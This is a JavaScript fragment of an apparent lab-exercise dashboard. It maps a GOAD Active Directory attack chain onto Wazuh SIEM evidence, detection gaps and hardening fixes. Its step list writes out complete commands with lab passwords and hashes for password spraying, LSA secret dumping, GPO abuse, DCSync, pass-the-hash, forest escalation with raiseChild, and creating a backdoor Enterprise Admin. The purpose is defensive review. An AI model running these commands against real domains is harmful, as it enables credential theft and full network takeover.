+  kingslanding:{x:610,y:215,r:46,fill:"#3b342e",stroke:"#ff5a52",icon:"assets/icons/kingslanding.png",name:"Kingslanding",ip:"192.168.56.10",
+    role:"Forest Root Domain Controller",domain:"sevenkingdoms.local",agentNote:"agent 002 · Win Server 2019",
+    users:[["orange","north\\goadmin","cross-trust auth via trust key"],["red","sevenkingdoms\\goadmin","Enterprise Admin / root DA"],["purple","KINGHODOR","malicious persistence (EA+DA)"]],
+    siem:"agent 002 · kingslanding · 192.168.56.10 (Win Server 2019)",
+    alerts:[["Cross-trust goadmin: 4624 ×47 / 92652 ×44","trust"],["KINGHODOR created (4720/4738) — EA add NOT logged","kinghodor"],["Root DCSync (4662): 0 events — GAP","dcsync"]]},
+  wazuh:{x:565,y:60,r:32,fill:"#0e0d0a",stroke:"#3ddc84",icon:"assets/icons/wazuh.png",name:"Wazuh",ip:"192.168.56.51",
+    role:"SIEM manager (goad-vm-wazuh)",domain:"agents: WF · CB · KL",
+    siem:"OpenSearch indices wazuh-alerts-*",note:"All evidence pulled live from this manager's indexer + dashboard exports.",
+    alerts:[["NTLM overview + KINGHODOR persistence exported","ntlm_all"],["Detection gaps: GPO 5136, DCSync 4662, EA-add 4756","dcsync"]]}
+};
+const EDGES=[
+  {id:"jb-wf",a:"jumpbox",b:"winterfell",cls:"attack"},
+  {id:"jb-cb",a:"jumpbox",b:"castelblack",cls:"attack"},
+  {id:"jb-kl",a:"jumpbox",b:"kingslanding",cls:"attack"},
+  {id:"wf-kl",a:"winterfell",b:"kingslanding",cls:"trust"}
+];
+const DOMAINS={
+  north:{label:"north (CHILD)",full:"north.sevenkingdoms.local",dc:"Winterfell · 192.168.56.11",
+    sid:"S-1-5-21-1814927890-1415249844-1188444219",
+    trust:"Bidirectional trust to sevenkingdoms.local — SID filtering DISABLED",
+    da:["EDDARD.STARK (legit)","ADMINISTRATOR","GOADMIN"],
+    users:[["green","brandon.stark","foothold — SYSVOL read, no ACL edges"],["yellow","samwell.tarly","GenericWrite/WriteOwner/WriteDacl on GPO STARKWALLPAPER"],["yellow","jeor.mormont","local admin on Castelblack"],["yellow","sql_svc","MSSQL sysadmin (Kerberoastable)"],["red","goadmin","child Domain Admin (post-GPO + DCSync)"]],
+    alerts:[["brandon.stark foothold logons","sysvol"],["GPO takeover (5136/4698)","gpo"],["Child DCSync (4662)","dcsync"]],bh:"north"},
+  root:{label:"root (FOREST)",full:"sevenkingdoms.local",dc:"Kingslanding · 192.168.56.10",
+    sid:"S-1-5-21-2456594957-880492381-2139086532",
+    trust:"Foreign Enterprise Admins hold GenericAll on the child domain object",
+    da:["GOADMIN (root DA / EA)","ADMINISTRATOR","KINGHODOR (attacker-added)"],
+    users:[["orange","north\\goadmin","authenticates over trust"],["red","sevenkingdoms\\goadmin","Enterprise Admin — full forest"],["purple","KINGHODOR","persistence: EA + DA, created via WMI"]],
+    alerts:[["Cross-trust goadmin logons","trust"],["KINGHODOR creation & use","kinghodor"],["Root DCSync (4662)","dcsync"]],bh:"root"}
+};
+const STEPS=[
+  {n:1,ph:"foothold",t:"Password spray → brandon.stark",hosts:["jumpbox","winterfell","castelblack"],harden:"spray",evid:"spray",
+    cmd:"crackmapexec smb $WF $CB -d north.sevenkingdoms.local -u brandon.stark -p 'iseedeadpeople'",loot:"brandon.stark : iseedeadpeople"},
+  {n:2,ph:"foothold",t:"SYSVOL / NETLOGON secret.ps1",hosts:["jumpbox","winterfell"],harden:"sysvol",evid:"sysvol",
+    cmd:"smbclient //$WF/NETLOGON -U 'north.sevenkingdoms.local/brandon.stark%iseedeadpeople' -c 'get secret.ps1'",loot:"jeor.mormont : _L0ngCl@w_ (cleartext in script)"},
+  {n:3,ph:"foothold",t:"LDAP description leak",hosts:["jumpbox","winterfell"],harden:"ldap_desc",evid:"ldap_desc",
+    logNote:"New query confirmed: spray locked samwell.tarly out 4× on Winterfell (rule 60115, level 9) — then 6 successful NTLM logons (92652) when those creds were reused. The SIEM had level-9 alerts for samwell's lockout; no action was taken. See samwell_wf evidence block.",
+    cmd:"crackmapexec ldap $WF -u brandon.stark -p 'iseedeadpeople' --users",loot:"samwell.tarly : Heartsbane (in description attribute)"},
+  {n:4,ph:"child",t:"Local admin on Castelblack",hosts:["jumpbox","castelblack"],harden:"laps",evid:"cb_localadmin",
+    cmd:"crackmapexec smb 192.168.56.22 -u jeor.mormont -p '_L0ngCl@w_'",loot:"(Pwn3d!) — local Administrator on CB"},
+  {n:5,ph:"child",t:"LSA secrets dump → sql_svc",hosts:["jumpbox","castelblack"],harden:"mssql",evid:"mssql",
+    cmd:"secretsdump.py 'north.sevenkingdoms.local/jeor.mormont:_L0ngCl@w_@192.168.56.22'",loot:"sql_svc : YouWillNotKerboroast1ngMeeeeee (cleartext LSA)"},
+  {n:6,ph:"child",t:"MSSQL sysadmin / xp_cmdshell",hosts:["jumpbox","castelblack"],harden:"mssql",evid:"mssql",
+    cmd:"crackmapexec mssql 192.168.56.22 -u sql_svc -p 'YouWillNotKerboroast1ngMeeeeee' -x 'whoami'",loot:"command exec as north\\sql_svc"},
+  {n:7,ph:"child",t:"BloodHound → GPO path",hosts:["jumpbox","winterfell"],harden:"gpo",evid:"ldap_desc",
+    logNote:"BloodHound runs from the jumpbox — Windows does not log “graph export”. Below: Brandon’s normal LDAP/network logons on the DC (same phase as user enum). The GPO abuse path itself is only in BloodHound + terminal proof.",
+    cmd:"bloodhound-python -d north.sevenkingdoms.local -u brandon.stark -p 'iseedeadpeople' -ns $WF -c All",loot:"samwell.tarly → GenericWrite on GPO STARKWALLPAPER"},
+  {n:8,ph:"child",t:"GPO abuse → DC local admin",hosts:["jumpbox","winterfell"],harden:"gpo",evid:"gpo",
+    logNote:"Samwell also appears in 6 “remote login” alerts (rule 92657, source .100) in the NTLM overview — but still zero events for GPO change (5136) or scheduled task (4698).",
+    cmd:"pygpoabuse.py 'north.sevenkingdoms.local/samwell.tarly:Heartsbane' -gpo-id C0CB1EC9-… -command 'net localgroup administrators samwell.tarly /add'",loot:"(Pwn3d!) on Winterfell — UNLOGGED"},
+  {n:9,ph:"child",t:"Child DCSync",hosts:["jumpbox","winterfell"],harden:"dcsync",evid:"dcsync",
+    logNote:"We queried specifically for replication audit (4662) and DCSync-style access — zero hits. Logons alone would not prove hash theft.",
+    cmd:"secretsdump.py -just-dc 'north.sevenkingdoms.local/samwell.tarly:Heartsbane@192.168.56.11'",loot:"goadmin / krbtgt / SEVENKINGDOMS$ hashes — UNLOGGED"},
+  {n:10,ph:"forest",t:"Pass-the-Hash over trust",hosts:["jumpbox","kingslanding"],harden:"sidfilter",evid:"trust",
+    cmd:"crackmapexec smb 192.168.56.10 -d north.sevenkingdoms.local -u goadmin -H aad3b…:dbd13e1c…",loot:"[+] auth via trust (not root admin yet)"},
+  {n:11,ph:"forest",t:"raiseChild → forest escalation",hosts:["jumpbox","winterfell","kingslanding"],harden:"sidfilter",evid:"trust",
+    cmd:"raiseChild.py 'north.sevenkingdoms.local/goadmin:NgtI75cKV+Pu' -target-exec kingslanding.sevenkingdoms.local",loot:"root goadmin c66d7202… + root krbtgt (ExtraSid EA …-519)"},
+  {n:12,ph:"forest",t:"Root DCSync",hosts:["jumpbox","kingslanding"],harden:"dcsync",evid:"dcsync",
+    cmd:"secretsdump.py -just-dc 'sevenkingdoms.local/goadmin:8dCT-DJjgScp@192.168.56.10'",loot:"full sevenkingdoms.local NTDS — forest takeover, UNLOGGED"},
+  {n:13,ph:"persist",t:"Create KINGHODOR (EA+DA)",hosts:["jumpbox","kingslanding"],harden:"persist",evid:"kinghodor",
+    cmd:"wmiexec.py -hashes …c66d7202… 'sevenkingdoms.local/goadmin@192.168.56.10' 'net user KINGHODOR holdthatdoor /add /domain'",loot:"KINGHODOR in EA + DA (4720 caught · group-add NOT)"},
+  {n:14,ph:"persist",t:"Verify KINGHODOR (C$ + DCSync)",hosts:["jumpbox","kingslanding"],harden:"persist",evid:"kinghodor",
+    cmd:"smbclient //192.168.56.10/C$ -U 'sevenkingdoms.local/KINGHODOR%holdthatdoor' -c dir",loot:"C$ access + DCSync as KINGHODOR"},
+  {n:15,ph:"persist",t:"LDAP confirm EA membership",hosts:["jumpbox","kingslanding"],harden:"persist",evid:"kinghodor",
+    cmd:"ldapsearch -D 'goadmin@sevenkingdoms.local' -b 'CN=Enterprise Admins,…' member | grep KINGHODOR",loot:"member: CN=KINGHODOR,…"}
+];
+const HARDENING=[
+  {id:"spray",title:"Strong passwords + lockout after failed tries",scope:"All domains",mitre:"T1110 Brute Force",status:"on",evid:"spray",
+    consensus:"required",topo:{type:"attack",t:["winterfell","castelblack","kingslanding"]},
+    why:"The break-in started because <b>brandon.stark</b> had a weak password (<b>iseedeadpeople</b>). Wazuh logged <b>302 failed logins</b> from the jumpbox (.100), including <b>25 high-severity burst alerts</b> (rule 60204, level 10). A dedicated query confirmed: <b>samwell.tarly's account was locked out 4 times</b> (rule 60115, level 9) on Winterfell during the spray. The SIEM had every signal — lockout, burst-fail, single source IP. Nothing was acted on.",
+    fix:"Enforce account lockout policy; ban common passwords (NCSC 100k list or similar); alert on 60204 + 60115 from a single source IP; consider geo-blocking the attacker subnet.",
+    query:"data.win.system.eventID:4625 AND data.win.eventdata.ipAddress:192.168.56.100",expect:"4625 · rules 60122/60204"},
+  {id:"sysvol",title:"No passwords in logon scripts (SYSVOL / NETLOGON)",scope:"Winterfell DC",mitre:"T1552.001 Creds in Files",status:"on",evid:"sysvol",
+    consensus:"required",topo:{type:"attack",t:["winterfell"]},
+    why:"Brandon read <b>secret.ps1</b> from NETLOGON and got <b>jeor.mormont’s password</b>. We see Brandon’s successful network logons (29×), but <b>no file-share events</b> (5140/5145) — so the actual file read does not appear in the SIEM.",
+    fix:"Remove secrets from scripts; turn on file-share auditing on SYSVOL; scan SYSVOL for passwords in CI.",
+    query:"agent.ip:192.168.56.11 AND data.win.system.eventID:(4624 OR 5140 OR 5145) AND data.win.eventdata.targetUserName:brandon.stark",expect:"4624 yes · 5140/5145 missing"},
+  {id:"ldap_desc",title:"No passwords in user profile fields (LDAP description)",scope:"Winterfell DC",mitre:"T1087 Account Discovery",status:"on",evid:"ldap_desc",
+    consensus:"required",topo:{type:"attack",t:["winterfell"]},
+    why:"<b>samwell.tarly</b>’s password was stored in the AD <b>description</b> field — any domain user could read it. LDAP “read description” does not raise its own alert; only Brandon’s login to the DC is logged.",
+    fix:"Clear description/info fields; don’t store secrets in AD attributes; watch for bulk LDAP user listing from one workstation.",
+    query:"agent.ip:192.168.56.11 AND data.win.system.eventID:4624 AND data.win.eventdata.targetUserName:brandon.stark",expect:"4624 logons only"},
+  {id:"laps",title:"Unique local admin passwords (LAPS)",scope:"Castelblack",mitre:"T1078 Valid Accounts",status:"on",evid:"cb_localadmin",
+    consensus:"required",topo:{type:"attack",t:["castelblack"]},
+    why:"<b>jeor.mormont</b> is shared local admin on Castelblack (LAPS off). That allowed dumping LSA secrets. Wazuh shows <b>15 remote-login alerts</b> (92652) plus logon/logoff pairs from .100.",
+    fix:"Deploy LAPS; remove shared local admins; alert when a non-server account gets “special privileges” (4672) if that audit is on.",
+    query:"agent.ip:192.168.56.22 AND data.win.eventdata.targetUserName:jeor.mormont",expect:"4624/4634 · rule 92652"},
+  {id:"mssql",title:"Turn off xp_cmdshell; don’t store SQL password in LSA",scope:"Castelblack SQL",mitre:"T1505 Server Software Component",status:"on",evid:"mssql",
+    consensus:"debate",topo:{type:"attack",t:["castelblack"]},
+    debate:"Turning off <b>xp_cmdshell</b> is a must. Moving SQL to a <b>group managed service account (gMSA)</b> is the part teams often argue about — it can break jobs and apps. Alternative: very long random password + strict scope.",
+    why:"<b>sql_svc</b> could run OS commands via SQL. Its password was in LSA in cleartext. Logs: 2 failed logins, then 9 successes — all on Castelblack, no remote IP in many rows.",
+    fix:"Disable xp_cmdshell; use gMSA or hardened service account; don’t leave SQL passwords in LSA.",
+    query:"agent.ip:192.168.56.22 AND data.win.eventdata.targetUserName:sql_svc",expect:"4624/4625 · rules 60106/60122"},
+  {id:"gpo",title:"Alert when Group Policy is changed + limit who can edit GPOs",scope:"Winterfell DC",mitre:"T1484.001 GPO Modification",status:"gap",evid:"gpo",
+    consensus:"required",topo:{type:"attack",t:["winterfell"]},
+    why:"Samwell abused write access to a GPO and became local admin on the DC. That is the worst step in the child domain — and the SIEM has <b>zero</b> events for GPO change (5136) or new scheduled task (4698). We only pulled empty query results.",
+    fix:"Enable directory change auditing; forward 5136/5137 and 4698; remove Samwell’s write rights on the GPO.",
+    query:"agent.ip:192.168.56.11 AND data.win.system.eventID:(5136 OR 5137 OR 4698 OR 4702) AND data.win.eventdata.targetUserName:samwell.tarly",expect:"5136/4698 expected — none found"},
+  {id:"dcsync",title:"Detect hash theft via replication (DCSync / event 4662)",scope:"Winterfell + Kingslanding",mitre:"T1003.006 DCSync",status:"gap",evid:"dcsync",
+    consensus:"debate",topo:{type:"attack",t:["winterfell","kingslanding"]},
+    debate:"You need to detect DCSync — but raw <b>4662</b> is noisy because real DCs replicate all day. Teams must tune allow-lists. Rotating <b>krbtgt twice</b> after an incident is not optional.",
+    why:"Both child and root hash dumps ran with <b>no 4662 alerts at all</b> — replication auditing was off. The attack succeeded entirely off-log for this technique.",
+    fix:"Enable DS access auditing + DCSync SACL; alert when a non-DC account requests replication; rotate krbtgt twice.",
+    query:"data.win.system.eventID:4662 AND agent.name:(winterfell OR kingslanding)",expect:"4662 expected — none found"},
+  {id:"sidfilter",title:"Trust / forest: limit child admins reaching root",scope:"Trust Winterfell ↔ Kingslanding",mitre:"T1134.005 SID History / T1482",status:"on",evid:"trust",
+    consensus:"debate",topo:{type:"trust",t:["winterfell","kingslanding"]},
+    debate:"In one forest, Microsoft does not enable SID filtering on the parent–child trust by default. Turning it on can break normal cross-domain admin work. Discuss: treat child DCs as fully trusted, or redesign the forest.",
+    why:"Trust had SID filtering off, so child <b>goadmin</b> / krbtgt could be abused toward root. Logs: <b>105 events</b> for goadmin on Kingslanding (44× remote NTLM alert 92652) — movement was visible, not the trust misconfig itself.",
+    fix:"Review trust settings; monitor cross-domain admin logons; assume child domain admins can hurt the forest.",
+    query:"agent.ip:192.168.56.10 AND data.win.eventdata.targetUserName:goadmin",expect:"4624/4625 · rule 92652"},
+  {id:"persist",title:"Alert when someone is added to Enterprise / Domain Admins",scope:"Kingslanding root DC",mitre:"T1136.002 / T1098 Persistence",status:"gap",evid:"kinghodor",
+    consensus:"required",topo:{type:"attack",t:["kingslanding"]},
+    why:"<b>KINGHODOR</b> was created and changed — Wazuh caught that (4720/4722/4738, rules 60109/60110). Adding the account to <b>Enterprise Admins / Domain Admins</b> did <b>not</b> log (no 4728/4756). That is the dangerous part.",
+    fix:"Audit security group changes; high-severity alert on EA/DA adds; use just-in-time admin where possible.",
+    query:"agent.ip:192.168.56.10 AND data.win.system.eventID:(4720 OR 4722 OR 4728 OR 4732 OR 4756) AND data.win.eventdata.targetUserName:KINGHODOR",expect:"4720/4738 yes · 4728/4756 missing"},
+  {id:"ntlm",title:"Block or watch the jumpbox (.100); fix misleading “RDP” alerts",scope:"All DCs/members from .100",mitre:"T1021 Remote Services",status:"on",evid:"ntlm_all",
+    consensus:"debate",topo:{type:"attack",t:["winterfell","castelblack","kingslanding"]},
+    debate:"Keeping the unknown Linux host off the domain network is clear. A <b>full ban on NTLM</b> needs a careful rollout — many apps still need it. Retitling rule 92657 (it says “RDP” for NetExec logons) is uncontroversial.",
+    why:"One host (<b>UBUNTU-JUMPBOX</b>, .100) drove spray, lateral movement, and admin logons. Rule 92657 even flags <b>ANONYMOUS LOGON</b> as “possible RDP” — that text is wrong for this lab.",
+    fix:"Segment jumpbox; restrict NTLM where possible; rewrite 92657 to describe tool-based NTLM, not RDP.",
+    query:"rule.id:(92652 OR 92657) AND data.win.eventdata.workstationName:UBUNTU-JUMPBOX",expect:"4624 · rule 92657 (25 in export)"},
+  {id:"kerbnoise",title:"Reduce Kerberos ticket noise (::1 on the DC)",scope:"Wazuh indexing",mitre:"Detection Engineering",status:"on",evid:"kerberos",
+    consensus:"debate",topo:{type:"kdc",t:["winterfell"]},
+    debate:"Filtering <b>10k+</b> local 4769 events helps analysts — but suppression can hide abuse if done carelessly. Decide: drop vs. send to a cheap archive index.",
+    why:"Ticket requests from <b>::1</b> (DC talking to itself) flooded the index and capped search results. Most are benign lab noise, not the attack.",
+    fix:"Filter 4769 from ::1/127.0.0.1; keep cross-host Kerberos tickets in the main index.",
+    query:"data.win.system.eventID:4769 AND data.win.eventdata.ipAddress:\"::1\"",expect:"4769 · rule 60106 (10k+)"}
+];
+const EVIDENCE_IMG="assets/evidence/";
+const BH_TOPO_CREDIT="providedbyrafaelpietridavila";
+const PROOF={
+  steps:{
+    4:[
+      {src:EVIDENCE_IMG+"cme_castelblack.png",caption:"CrackMapExec: jeor.mormont gültig auf Winterfell, Castelblack, Kingslanding — (Pwn3d!) nur auf Castelblack (SMB signing aus)."},
+      {src:EVIDENCE_IMG+"jeor_whoami.png",caption:"Remote whoami /all via WMI: Mitgliedschaft BUILTIN\\Administrators bestätigt (Pivot-Punkt)."}
+    ],
+    5:[
+      {src:EVIDENCE_IMG+"lsa_secretsdump.png",caption:"Impacket secretsdump als lokaler Admin: SAM/Cache/LSA — Klartext sql_svc aus _SC_MSSQL$SQLEXPRESS."}
+    ],
+    7:[
+      {src:EVIDENCE_IMG+"bh_shortest_path.png",caption:"BloodHound: kürzester Pfad zu Domain Admins (GPO-GenericWrite, Delegation, DCSync-Kanten).",bhTopology:true},
+      {src:EVIDENCE_IMG+"domain_admins.png",caption:"BloodHound: GOADMIN / EDDARD / ADMINISTRATOR als MemberOf Domain Admins (Zielgruppe).",bhTopology:true}
+    ],
+    8:[
+      {src:EVIDENCE_IMG+"gpo_winterfell_pwn3d.png",caption:"pyGPOAbuse Scheduled Task + CME: samwell.tarly (Pwn3d!) auf Winterfell nach GPO-Missbrauch."}
+    ],
+    9:[
+      {src:EVIDENCE_IMG+"dcsync_ntds.png",caption:"secretsdump -just-dc (DRSUAPI): NTDS-Hash-Dump — goadmin, krbtgt, Domain-User (DCSync-Nachweis)."},
+      {src:EVIDENCE_IMG+"domain_admins.png",caption:"Graph-Kontext: wer Domain Admins im Child ist (Post-DCSync-Relevanz).",bhTopology:true},
+      {src:EVIDENCE_IMG+"image(1).png",caption:"CrackMapExec SMB: north.sevenkingdoms.local\\goadmin + Child-DA-Hash dbd13e1c… → (Pwn3d!) auf Winterfell (192.168.56.11) — DA-Zugriff auf dem Child-DC nach DCSync."}
+    ],
+    10:[
+      {src:EVIDENCE_IMG+"pth_wf_cb.png",caption:"Pass-the-Hash: eddard.stark & goadmin auf Winterfell + Castelblack — (Pwn3d!) mit DA-Hashes (Trust/Lateral)."},
+      {src:EVIDENCE_IMG+"grafik.png",caption:"Lab-Dead-End: getST.py mit Child-TGT (-k) gegen cifs/kingslanding.sevenkingdoms.local → Kerberos SessionError KDC_ERR_WRONG_REALM. Cross-realm braucht korrekten KDC/Realm — praktisch blieben NTLM/PTH über Trust und raiseChild."}
+    ],
+    12:[
+      {src:EVIDENCE_IMG+"dcsync_ntds.png",caption:"Lab-Session: DRSUAPI-Extraktion gegen Root-DC (gleiches Tooling wie Forest-DCSync)."}
+    ],
+    15:[
+      {src:EVIDENCE_IMG+"image.png",caption:"ldapsearch auf Enterprise Admins: member: CN=KINGHODOR,CN=Users,DC=sevenkingdoms,DC=local — Persistenz-Backdoor in EA bestätigt (ubuntu-jumpbox)."}
+    ]
+  },
+  hosts:{
+    jumpbox:[
+      {src:EVIDENCE_IMG+"linux_windows_ops.png",caption:"Operator-Kontext: Linux-Tools auf dem Jumpbox ↔ Windows-Zielartefakte (CME, secretsdump, schtasks-Äquivalent)."},
+      {src:EVIDENCE_IMG+"grafik.png",caption:"Kerberos-Experiment vom Jumpbox: getST.py / falscher Realm beim Root-SPN — siehe auch Schritt 10."}
+    ],
+    castelblack:[
+      {src:EVIDENCE_IMG+"cme_castelblack.png",caption:"Erfolgreiche Admin-Auth jeor.mormont → Castelblack."},
+      {src:EVIDENCE_IMG+"jeor_whoami.png",caption:"Ausgeführter Befehl auf dem Host (Gruppenmitgliedschaft)."},
+      {src:EVIDENCE_IMG+"lsa_secretsdump.png",caption:"Registry/LSA-Dump von diesem Server."}
+    ],
+    winterfell:[
+      {src:EVIDENCE_IMG+"gpo_winterfell_pwn3d.png",caption:"Nach GPO-Task: samwell.tarly local admin auf dem DC."},
+      {src:EVIDENCE_IMG+"bh_shortest_path.png",caption:"BloodHound-Pfade über Winterfell / GPO / DC.",bhTopology:true},
+      {src:EVIDENCE_IMG+"image(1).png",caption:"Child-DA goadmin (Pwn3d!) auf Winterfell — Hash-basierte Admin-Session nach DCSync."}
+    ],
+    kingslanding:[
+      {src:EVIDENCE_IMG+"dcsync_ntds.png",caption:"DRSUAPI gegen Kingslanding (Forest-Hash-Extraktion in der Lab-Session)."},
+      {src:EVIDENCE_IMG+"pth_wf_cb.png",caption:"Cross-Trust-PTH-Tests (goadmin/eddard) — relevant für Root-Logons."}
+    ]
+  },
+  domains:{
+    north:[
+      {src:EVIDENCE_IMG+"domain_admins.png",caption:"Mitglieder Domain Admins@north.sevenkingdoms.local (GOADMIN markiert kompromittiert).",bhTopology:true},
+      {src:EVIDENCE_IMG+"bh_shortest_path.png",caption:"Angriffsgraph: mehrere Kanten zu Domain Admins (GPO, Delegation, ACLs).",bhTopology:true}
+    ],
+    root:[
+      {src:EVIDENCE_IMG+"dcsync_ntds.png",caption:"Terminal: NTDS-Replikation / Hash-Liste nach Forest-Eskalation."},
+      {src:EVIDENCE_IMG+"image.png",caption:"LDAP: KINGHODOR als member unter Enterprise Admins@sevenkingdoms.local."}
+    ]
+  },
+  hardening:{
+    laps:[
+      {src:EVIDENCE_IMG+"cme_castelblack.png",caption:"Shared local admin ohne LAPS: ein Passwort → (Pwn3d!) auf Castelblack."},
+      {src:EVIDENCE_IMG+"jeor_whoami.png",caption:"Nachweis Administrator-Gruppe auf dem Member Server."}
+    ],
+    mssql:[
+      {src:EVIDENCE_IMG+"lsa_secretsdump.png",caption:"Service-Passwort sql_svc im Klartext in LSA — direkter Treiber für xp_cmdshell-Härtung."}
+    ],
+    gpo:[
+      {src:EVIDENCE_IMG+"gpo_winterfell_pwn3d.png",caption:"GPO-Scheduled-Task → sofort (Pwn3d!) auf dem DC — SIEM-blinder Spot."}
+    ],
+    dcsync:[
+      {src:EVIDENCE_IMG+"dcsync_ntds.png",caption:"DRSUAPI-Dump: das, was 4662 hätte sichtbar machen müssen."},
+      {src:EVIDENCE_IMG+"domain_admins.png",caption:"Auswirkung: volle DA-Mitgliedschaft im Graph.",bhTopology:true}
+    ],
+    sidfilter:[
+      {src:EVIDENCE_IMG+"pth_wf_cb.png",caption:"Child-DA-Hashes authentifizieren lateral über WF/CB — Trust ohne SID-Filter."},
+      {src:EVIDENCE_IMG+"grafik.png",caption:"Kerberos cross-realm ist fehleranfällig (KDC_ERR_WRONG_REALM) — Trust-Abuse in der Praxis oft NTLM/ExtraSid (raiseChild), nicht einfaches getST."}
+    ],
+    persist:[
+      {src:EVIDENCE_IMG+"image.png",caption:"Nachweis: KINGHODOR in Enterprise Admins per ldapsearch — Gruppen-Adds (4728/4756) fehlen im SIEM, LDAP-Check schließt die Lücke manuell."}
+    ]
+  }
+};
+function proofItems(kind,key){
+  const bag=PROOF[kind]||{};
+  return bag[key]||[];
+}
+function proofBlock(items,label){
+  if(!items||!items.length)return "";
+  const lab=label||("Terminal- & Graph-Nachweis ("+items.length+")");
+  let s=`<details class="proof"><summary>${esc(lab)}</summary><div class="proof-inner">`;
+  items.forEach(p=>{
+    const credit=p.bhTopology?`<span class="proof-credit">${esc(BH_TOPO_CREDIT)}</span>`:"";
+    s+=`<figure><figcaption>${esc(p.caption)}${credit}</figcaption><button type="button" class="proof-img-btn" data-full="${esc(p.src)}" data-alt="${esc(p.caption)}" title="Click to expand"><img src="${esc(p.src)}" alt="${esc(p.caption)}" loading="lazy" decoding="async"/></button></figure>`;
+  });
+  return s+`</div></details>`;
+}
+function openImgLightbox(src,alt){
+  const lb=$("#imgLightbox"),img=$("#imgLightboxImg");
+  if(!lb||!img||!src)return;
+  img.src=src; img.alt=alt||"";
+  lb.hidden=false; lb.classList.add("open");
+  document.body.style.overflow="hidden";
+  lb.querySelector(".lb-close")?.focus();
+}
+function closeImgLightbox(){
+  const lb=$("#imgLightbox"),img=$("#imgLightboxImg");
+  if(!lb)return;
+  lb.classList.remove("open"); lb.hidden=true;
+  if(img){img.src=""; img.alt="";}
+  document.body.style.overflow="";
+}
+function initImgLightbox(){
+  document.addEventListener("click",e=>{
+    const btn=e.target.closest(".proof-img-btn");
+    if(btn){e.preventDefault(); openImgLightbox(btn.dataset.full,btn.dataset.alt); return;}
+    const lb=$("#imgLightbox");
+    if(lb&&lb.classList.contains("open")&&(e.target===lb||e.target.closest(".lb-close"))) closeImgLightbox();
+  });
+  document.addEventListener("keydown",e=>{
+    if(e.key==="Escape") closeImgLightbox();
+  });
+  $("#imgLightbox")?.addEventListener("click",e=>{
+    if(e.target.id==="imgLightboxImg") e.stopPropagation();
+  });
+}
+function proofsForStep(n){return proofItems("steps",n);}
+
+const SVGNS="http://www.w3.org/2000/svg";
+const $=s=>document.querySelector(s), $$=s=>Array.from(document.querySelectorAll(s));
+const esc=s=>String(s==null?"":s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
+function stepLink(sn){
+  if(sn==null||sn==="")return `<span class="nolink">—</span>`;
+  return `<button type="button" class="lnk lnk-pill" onclick="jumpStep(${sn})">step ${sn}</button>`;
+}
+function hardLinkBtn(id,html){
+  return `<button type="button" class="lnk lnk-block" onclick="jumpHard('${id}')">${html}</button>`;
+}
+// lightweight inline markdown for narratives: **bold** and `code`
+function mdInline(t){
+  return esc(t)
+    .replace(/`([^`]+)`/g,'<code class="inl">$1</code>')
+    .replace(/\*\*([^*]+)\*\*/g,'<b>$1</b>');
+}
+// highlight the leading tool/binary in a command string
+function fmtCmd(c){
+  const e=esc(c);
+  return e.replace(/^(\s*)([\w./-]+)/,'$1<span class="tok">$2</span>');
+}
+const lvlClass=l=>l>=10?"hi":l>=6?"md":"lo";
+const ruleTitle=r=>RULE_DESC[r]?` title="${esc(RULE_DESC[r])}"`:"";
+const evtTitle=e=>EVD_DESC[e]?` title="${esc(EVD_DESC[e])}"`:"";
+function evidToHard(evid){
+  if(evid==="attacker")return "ntlm";
+  const h=HARDENING.find(x=>x.evid===evid);
+  return h?h.id:"spray";
+}
+
+/* ---------- KPIs ---------- */
+function renderKPIs(){
+  const c=[
+    {k:"Verdict",v:"OWNED",x:"root DCSync confirmed",a:"var(--red)"},
+    {k:"Attack steps",v:"15",x:"foothold → persistence",a:"var(--blue)"},
+    {k:"Spray failures",v:"302",x:"4625 · burst 60204×25 fired",a:"var(--amber)"},
+    {k:"Attacker NTLM logons",v:"111",x:"all from UBUNTU-JUMPBOX .100",a:"var(--orange)"},
+    {k:"Secrets captured",v:"20+",x:"NT hashes · krbtgt · AES · cleartext",a:"var(--purple)"},
+    {k:"Detection gaps",v:"3",x:"GPO 5136 · DCSync 4662 · EA-add 4756",a:"var(--red)"}
+  ];
+  $("#kpis").innerHTML=c.map(x=>`<div class="kpi" style="--accent:${x.a}"><div class="k">${x.k}</div><div class="v">${x.v}</div><div class="x">${esc(x.x)}</div></div>`).join("");
+}
+function renderLegend(){
+  const items=[["#acacac","Attacker"],["#ffb020","Child DC"],["#ff5a52","Root DC"],["#4aa3ff","Member"],["#3ddc84","SIEM"]];
+  const privs=[["#3ddc84","base"],["#ffb020","local-admin"],["#ff8a3d","cross-trust"],["#ff5a52","DA/EA"],["#b08bff","persistence"]];
+  $("#legend").innerHTML=items.map(i=>`<span><i style="background:${i[0]}"></i>${i[1]}</span>`).join("")
+    +'<span style="opacity:.4">|</span>'+privs.map(i=>`<span><i style="background:${i[0]};border-radius:50%"></i>${i[1]}</span>`).join("");
+}
+
+/* ---------- topology ---------- */
+function buildTopo(){
+  const svg=$("#topo"); svg.innerHTML="";
+  const defs=document.createElementNS(SVGNS,"defs");
+  defs.innerHTML='<marker id="ah" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#ff5a52"/></marker>';
+  svg.appendChild(defs);
+  EDGES.forEach(e=>{
+    const a=HOSTS[e.a],b=HOSTS[e.b];
+    const p=document.createElementNS(SVGNS,"line");
+    p.setAttribute("x1",a.x);p.setAttribute("y1",a.y);p.setAttribute("x2",b.x);p.setAttribute("y2",b.y);
+    p.setAttribute("class","edge "+e.cls); p.id="e-"+e.id;
+    if(e.cls==="attack") p.setAttribute("marker-end","url(#ah)");
+    svg.appendChild(p);
+  });
+  const tl=document.createElementNS(SVGNS,"text");
+  tl.setAttribute("x",(HOSTS.winterfell.x+HOSTS.kingslanding.x)/2);tl.setAttribute("y",140);
+  tl.setAttribute("text-anchor","middle");tl.setAttribute("font-size","9.5");tl.setAttribute("fill","#4aa3ff");
+  tl.textContent="trust · SID filtering OFF"; svg.appendChild(tl);
+  Object.entries(HOSTS).forEach(([id,h])=>{
+    const g=document.createElementNS(SVGNS,"g");
+    g.setAttribute("class","node");g.setAttribute("transform",`translate(${h.x},${h.y})`);g.dataset.host=id;g.style.color=h.stroke;
+    const ring=document.createElementNS(SVGNS,"circle");
+    ring.setAttribute("class","ring");ring.setAttribute("r",h.r+3);ring.style.setProperty("--r0",(h.r+3)+"px");ring.style.setProperty("--r1",(h.r+16)+"px");
+    g.appendChild(ring);
+    // clipped icon (sits inside the host circle); fall back to fill color via background circle
